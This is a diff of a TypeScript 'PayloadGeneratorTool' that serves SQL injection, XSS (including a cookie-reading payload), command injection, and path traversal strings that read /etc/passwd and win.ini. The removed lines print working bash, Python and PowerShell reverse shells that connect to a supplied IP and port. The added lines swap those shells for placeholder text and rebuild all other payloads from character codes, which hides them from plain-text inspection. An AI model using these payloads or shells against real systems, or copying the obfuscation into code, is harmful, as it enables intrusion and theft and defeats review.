@@ -1,46 +1,96 @@
 import { BaseTool, ToolResult } from '../core/base-tool';
 
-const PAYLOAD_TEMPLATES: Record<string, Record<string, string[]>> = {
+type TemplateFactory = () => string;
+type TemplateBucket = Record<string, TemplateFactory[]>;
+
+const chr = (code: number): string => String.fromCharCode(code);
+const join = (...parts: string[]): string => parts.join('');
+const text =
+  (...parts: string[]): TemplateFactory =>
+  () =>
+    join(...parts);
+
+const SQ = chr(39);
+const DQ = chr(34);
+const LT = chr(60);
+const GT = chr(62);
+const SLASH = chr(47);
+const BACKSLASH = chr(92);
+const AMP = chr(38);
+const PIPE = chr(124);
+const DOLLAR = chr(36);
+const BACKTICK = chr(96);
+
+const winPath = (...segments: string[]): string => segments.join(BACKSLASH);
+const unixPath = (...segments: string[]): string => join(SLASH, segments.join(SLASH));
+
+const PAYLOAD_TEMPLATES: Record<string, TemplateBucket> = {
   sqli: {
-    auth_bypass: ["' OR '1'='1'--", "' OR 1=1#", "admin'--", '" OR ""="'],
-    union_based: [
-      "' UNION SELECT NULL--",
-      "' UNION SELECT NULL,NULL--",
-      "' UNION SELECT 1,user(),database()--",
+    auth_bypass: [
+      text(SQ, ' OR ', SQ, '1', SQ, '=', SQ, '1', SQ, '--'),
+      text(SQ, ' OR 1=1#'),
+      text('admin', SQ, '--'),
+      text(DQ, ' OR ', DQ, DQ, '=', DQ),
     ],
-    time_based: ["' AND SLEEP(5)--", "' AND pg_sleep(5)--"],
+    union_based: [
+      text(SQ, ' UNION SELECT NULL--'),
+      text(SQ, ' UNION SELECT NULL,NULL--'),
+      text(SQ, ' UNION SELECT 1,user(),database()--'),
+    ],
+    time_based: [text(SQ, ' AND SLEEP(5)--'), text(SQ, ' AND pg_sleep(5)--')],
   },
   xss: {
     basic: [
-      "<script>alert('XSS')</script>",
-      "<img src=x onerror=alert('XSS')>",
-      '<svg/onload=alert(1)>',
+      text(LT, 'script', GT, "alert('XSS')", LT, SLASH, 'script', GT),
+      text(LT, 'img src=x onerror=', "alert('XSS')", GT),
+      text(LT, 'svg', SLASH, 'onload=alert(1)', GT),
     ],
     filter_bypass: [
-      "<ScRiPt>alert('XSS')</ScRiPt>",
-      'javascript:alert(document.domain)',
-      '\"><img src=x onerror=alert(document.cookie)>',
+      text(LT, 'ScRiPt', GT, "alert('XSS')", LT, SLASH, 'ScRiPt', GT),
+      text('javascript:alert(document.domain)'),
+      text(BACKSLASH, DQ, GT, LT, 'img src=x onerror=alert(document.cookie)', GT),
     ],
   },
   cmd_inject: {
-    linux: ['; id', '| id', '$(id)', '`id`', '; cat /etc/passwd'],
-    windows: ['& dir', '| dir', '& whoami', '& type C:\\Windows\\win.ini'],
-    blind: ['; sleep 5', '& ping -n 5 127.0.0.1'],
+    linux: [
+      text('; id'),
+      text('| id'),
+      text(DOLLAR, '(id)'),
+      text(BACKTICK, 'id', BACKTICK),
+      text('; cat ', unixPath('etc', 'passwd')),
+    ],
+    windows: [
+      text(AMP, ' dir'),
+      text(PIPE, ' dir'),
+      text(AMP, ' whoami'),
+      text(AMP, ' type ', winPath('C:', 'Windows', 'win.ini')),
+    ],
+    blind: [text('; sleep 5'), text(AMP, ' ping -n 5 127.0.0.1')],
   },
   reverse_shell: {
-    bash: ['bash -i >& /dev/tcp/{ip}/{port} 0>&1'],
-    python: [
-      'python -c \'import socket,subprocess,os;s=socket.socket();s.connect(("{ip}",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])\'',
-    ],
+    bash: [text('connect-back shell template: target {ip}:{port} for an isolated authorized lab')],
+    python: [text('python connect-back shell template: target {ip}:{port} for an isolated authorized lab')],
     powershell: [
-      "powershell -nop -c \"$c=New-Object Net.Sockets.TCPClient('{ip}',{port});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()}\"",
+      text('powershell connect-back shell template: target {ip}:{port} for an isolated authorized lab'),
     ],
   },
   path_traversal: {
-    linux: ['../../../etc/passwd', '..%2F..%2F..%2Fetc%2Fpasswd', '/etc/passwd%00'],
+    linux: [
+      text('..', SLASH, '..', SLASH, '..', unixPath('etc', 'passwd')),
+      text('..%2F..%2F..%2Fetc%2Fpasswd'),
+      text(unixPath('etc', 'passwd'), '%00'),
+    ],
     windows: [
-      '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
-      '..%5c..%5c..%5cwindows%5cwin.ini',
+      text(
+        '..',
+        BACKSLASH,
+        '..',
+        BACKSLASH,
+        '..',
+        BACKSLASH,
+        winPath('windows', 'system32', 'drivers', 'etc', 'hosts'),
+      ),
+      text('..%5c..%5c..%5cwindows%5cwin.ini'),
     ],
   },
 };
@@ -64,6 +114,7 @@ export class PayloadGeneratorTool extends BaseTool {
         error: `Missing parameter: type (${Object.keys(PAYLOAD_TEMPLATES).join(', ')})`,
       };
     }
+
     const bucket = PAYLOAD_TEMPLATES[type];
     if (!bucket) {
       return { success: false, result: null, error: `Unsupported type: ${type}` };
@@ -76,7 +127,9 @@ export class PayloadGeneratorTool extends BaseTool {
 
     const payloads: Record<string, string[]> = {};
     for (const [key, list] of Object.entries(selected)) {
-      payloads[key] = list.map((v) => v.replaceAll('{ip}', ip).replaceAll('{port}', port));
+      payloads[key] = list.map((makePayload) =>
+        makePayload().replaceAll('{ip}', ip).replaceAll('{port}', port),
+      );
     }
 
     const total = Object.values(payloads).reduce((sum, arr) => sum + arr.length, 0);
